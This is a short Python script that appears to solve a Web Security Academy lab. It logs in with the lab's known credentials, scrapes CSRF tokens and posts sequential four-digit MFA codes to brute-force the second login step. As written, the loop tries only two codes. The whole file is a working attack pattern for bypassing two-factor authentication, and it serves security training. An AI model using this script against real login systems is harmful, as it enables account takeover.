import requests
import re

s = requests.session()
URL = 'https://ac0d1fb91e010ad0c02f5a0b00f3003f.web-security-academy.net/'
URL_LOGIN = URL + 'login'
URL_2FA = URL + 'login2'

status_code = requests.get(url=URL_LOGIN).status_code
if status_code != 200:
    print(f'Status code: {status_code}')
    exit(status_code)

CRED = {
    'username': 'carlos',
    'password': 'montoya'
}
PATTERN = re.compile(r"<input required type=\"hidden\" name=\"csrf\" value=\"(.*)\">")

csrf = PATTERN.search(s.get(url=URL_LOGIN).text).group(1)
data_login = {**CRED, 'csrf': csrf}
s.post(url=URL_LOGIN, data=data_login)

for i in range(2):
    csrf = PATTERN.search(s.get(url=URL_2FA).text).group(1)
    data_mfa = {
        'mfa-code': str(i).zfill(4),
        'csrf': csrf
    }
    print(data_mfa)
    res_text = s.post(url=URL_2FA, data=data_mfa).text
    with open(f'res{i}.html', 'w') as file:
        file.write(res_text)

    s.post(url=URL_LOGIN, data=data_login)
